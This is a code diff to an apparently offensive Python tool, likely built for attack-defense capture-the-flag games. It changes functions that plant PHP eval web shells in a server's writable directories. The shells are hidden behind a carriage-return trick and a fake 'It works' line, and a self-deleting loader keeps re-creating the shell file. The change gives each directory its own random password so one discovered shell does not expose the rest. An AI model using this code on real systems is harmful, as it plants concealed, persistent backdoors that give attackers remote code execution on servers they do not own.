@@ -47,32 +47,51 @@ def _write_remote(ws: WebShell, server_path: str, content: str) -> bool:
 
 
 def inject_webshell(
-    ws: WebShell, password: str, writable_dirs: list[str], *, output_dir: Path
-) -> list[str]:
-    """Drop ``<?php @eval($_REQUEST[password]) ?>`` into each writable dir."""
-    shell = f"<?php @eval($_REQUEST['{password}']);?>"
+    ws: WebShell,
+    password: str | None = None,
+    writable_dirs: list[str] | None = None,
+    *,
+    output_dir: Path,
+) -> list[tuple[str, str]]:
+    """Drop ``<?php @eval($_REQUEST[password]) ?>`` into each writable dir.
+
+    When ``password`` is ``None`` a fresh random password is generated *per
+    directory*, so discovering one dropped shell does not expose the others.
+    Returns ``(url, password)`` pairs.
+    """
     fake = "<?php print_r('It works');?>"
-    content = shell + "\r" + fake + " " * max(0, len(shell) - len(fake)) + "\n"
-    urls: list[str] = []
-    for directory in writable_dirs:
+    results: list[tuple[str, str]] = []
+    for directory in writable_dirs or []:
+        pw = password or random_string(16)
+        shell = f"<?php @eval($_REQUEST['{pw}']);?>"
+        content = shell + "\r" + fake + " " * max(0, len(shell) - len(fake)) + "\n"
         filename = f".{random_string(16)}.php"
         server_path = f"{directory.rstrip('/')}/{filename}"
         if _write_remote(ws, server_path, content):
             url = _url_for(ws, directory, filename)
-            urls.append(url)
-            _record(output_dir, f"{url} => {password}")
-            log.success(f"Injected: {url} (password={password})")
+            results.append((url, pw))
+            _record(output_dir, f"{url} => {pw}")
+            log.success(f"Injected: {url} (password={pw})")
         else:
             log.error(f"Write failed in {directory}")
-    return urls
+    return results
 
 
 def inject_memory_webshell(
-    ws: WebShell, password: str, writable_dirs: list[str], *, output_dir: Path
+    ws: WebShell,
+    password: str | None = None,
+    writable_dirs: list[str] | None = None,
+    *,
+    output_dir: Path,
 ) -> None:
-    """Drop a self-deleting loader that keeps re-creating the shell file."""
-    shell = f"<?php @eval($_REQUEST['{password}']);?>"
-    for directory in writable_dirs:
+    """Drop a self-deleting loader that keeps re-creating the shell file.
+
+    Like :func:`inject_webshell`, ``password=None`` yields a per-directory
+    random password.
+    """
+    for directory in writable_dirs or []:
+        pw = password or random_string(16)
+        shell = f"<?php @eval($_REQUEST['{pw}']);?>"
         target = f"{directory.rstrip('/')}/.index.php"
         loader = (
             "set_time_limit(0);ignore_user_abort(true);"
@@ -89,8 +108,8 @@ def inject_memory_webshell(
         url = _url_for(ws, directory, loader_name)
         if _activate(ws, url):
             shell_url = _url_for(ws, directory, ".index.php")
-            _record(output_dir, f"{shell_url} => {password} (memory)")
-            log.success(f"Memory webshell active: {shell_url} (password={password})")
+            _record(output_dir, f"{shell_url} => {pw} (memory)")
+            log.success(f"Memory webshell active: {shell_url} (password={pw})")
 
 
 def flag_reaper(ws: WebShell, code_url: str, writable_dirs: list[str]) -> int:
